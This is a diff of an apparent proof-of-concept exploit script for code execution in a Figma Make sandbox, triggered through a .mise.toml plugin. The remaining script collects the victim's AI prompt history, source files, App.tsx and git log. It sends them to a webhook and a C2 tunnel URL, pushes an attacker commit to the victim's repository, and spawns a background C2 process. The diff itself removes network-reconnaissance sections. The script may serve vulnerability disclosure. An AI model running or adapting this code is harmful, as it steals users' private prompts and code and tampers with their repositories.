@@ -2,7 +2,7 @@
 # =============================================================================
 # POC: Figma Make Sandbox RCE via .mise.toml
 # Writes proof to public/poc-proof.txt (visible in preview URL)
-# Optionally exfils to C2 if reachable
+# Exfils labeled sections to webhook.site
 # =============================================================================
 
 C2_URL="${C2_URL:-https://kappexpoc7.loca.lt}"
@@ -59,24 +59,6 @@ echo "=== UGIT CREDENTIAL ==="
 grep -A1 'extraHeader' /home/foundry/gitconfig 2>/dev/null || echo "not found"
 echo ""
 
-echo "=== NETWORK RECON ==="
-env | grep -iE 'proxy|https?_|no_proxy|firewall|allow|block|origin|egress' 2>/dev/null
-echo "-- resolv.conf --"
-cat /etc/resolv.conf 2>/dev/null
-echo "-- hosts --"
-cat /etc/hosts 2>/dev/null
-echo "-- iptables --"
-iptables -L -n 2>/dev/null || echo 'no access'
-echo "-- nftables --"
-nft list ruleset 2>/dev/null || echo 'no access'
-echo "-- sboxd config files --"
-find /services -type f -name '*.conf' -o -name '*.yaml' -o -name '*.json' -o -name '*.toml' 2>/dev/null
-echo "-- sboxd binary strings: domain/allow --"
-strings /services/agentplat/sbox/sboxd/sboxd_/sboxd 2>/dev/null | grep -iE 'allow|loca\.lt|github|egress|whitelist|domain|\.com|\.net|\.io|\.site' | sort -u | head -50
-echo "-- all env vars --"
-env 2>/dev/null | sort
-echo ""
-
 echo "============================================="
 echo "  This file was created by attacker-controlled"
 echo "  code executed during sandbox initialization."
@@ -94,37 +76,41 @@ webhook() {
     "$WEBHOOK_URL" >/dev/null 2>&1
 }
 
+# --- AI_PROMPTS: victim's full AI prompt history ---
 PROMPT_DATA=""
 for F in /workspaces/default/session/.sbox-sessions/*.json; do
   [ -f "$F" ] && PROMPT_DATA="${PROMPT_DATA}$(cat "$F" 2>/dev/null)"
 done
-
 [ -n "$PROMPT_DATA" ] && webhook "AI_PROMPTS" "$PROMPT_DATA"
 [ -n "$PROMPT_DATA" ] && exfil "=== VICTIM AI PROMPTS ===
 $PROMPT_DATA"
 
+# --- SOURCE_CODE: file listing of victim's src/ directory ---
 cd "$PROJDIR" 2>/dev/null
 SRC_LIST="$(find src/ -type f 2>/dev/null)"
 webhook "SOURCE_CODE" "$SRC_LIST"
 exfil "=== SOURCE CODE ===
 $SRC_LIST"
 
+# --- APP_TSX_CODE: application source code ---
 APP_TSX="$(cat src/App.tsx 2>/dev/null)"
 [ -n "$APP_TSX" ] && webhook "APP_TSX_CODE" "$APP_TSX"
 
+# --- GIT_LOG: victim's git remote and commit history ---
 GIT_INFO="$(git remote -v 2>/dev/null | head -1)
 $(git log --oneline -10 2>/dev/null)"
 webhook "GIT_LOG" "$GIT_INFO"
 exfil "=== GIT LOG ===
 $GIT_INFO"
 
+# --- UGIT_CREDENTIAL: confirms read+write git token present (redacted) ---
 UGIT_CRED="$(grep -c 'extraHeader' /home/foundry/gitconfig 2>/dev/null)"
 [ "$UGIT_CRED" -gt 0 ] 2>/dev/null && webhook "UGIT_CREDENTIAL" "credential_present=true (not exfiltrated for safety)"
 
-# Git push
+# --- GIT_PUSH: attacker commits to victim's repo ---
 echo "pwned by attacker at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$PUB/attacker-was-here.txt"
 git add "$PUB/poc-proof.txt" "$PUB/attacker-was-here.txt" 2>/dev/null
-git commit -m "attacker code injection via mise plugin" 2>/dev/null
+git commit -m "attacker code injection via mise plugin" >/dev/null 2>&1
 PUSH=$(git push 2>&1)
 webhook "GIT_PUSH" "$PUSH"
 exfil "=== GIT PUSH ===
@@ -150,36 +136,8 @@ if [ ! -f /tmp/.c2-spawned ]; then
   ' </dev/null >/dev/null 2>&1 &
 fi
 
-NET_RECON="$(
-echo '--- ENV PROXY ---'
-env | grep -iE 'proxy|https?_|no_proxy|curl|wget|firewall|allow|block|origin|egress' 2>/dev/null
-echo '--- /etc/environment ---'
-cat /etc/environment 2>/dev/null
-echo '--- resolv.conf ---'
-cat /etc/resolv.conf 2>/dev/null
-echo '--- hosts ---'
-cat /etc/hosts 2>/dev/null
-echo '--- iptables ---'
-iptables -L -n 2>/dev/null || echo 'no iptables access'
-echo '--- nftables ---'
-nft list ruleset 2>/dev/null || echo 'no nft access'
-echo '--- proxy/network configs ---'
-find /etc -name '*.conf' -o -name '*.cfg' -o -name '*.yaml' -o -name '*.yml' -o -name '*.json' 2>/dev/null | xargs grep -l -iE 'allow|deny|origin|proxy|upstream|egress|whitelist' 2>/dev/null | head -20
-echo '--- profile.d ---'
-cat /etc/profile.d/*.sh 2>/dev/null
-echo '--- ca-certs custom ---'
-ls /usr/local/share/ca-certificates/ 2>/dev/null
-echo '--- listening processes ---'
-ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
-echo '--- running processes ---'
-ps auxww 2>/dev/null
-)"
-webhook "NET_RECON" "$NET_RECON"
-
 # Re-run once on reload (not infinitely) — guard with flag file
 if [ ! -f /tmp/.mise-rerun-done ]; then
   touch /tmp/.mise-rerun-done
   (sleep 10 && rm -rf "$HOME/.local/share/mise/installs/build-metrics" 2>/dev/null) &
 fi
-
-cat "$OUT"
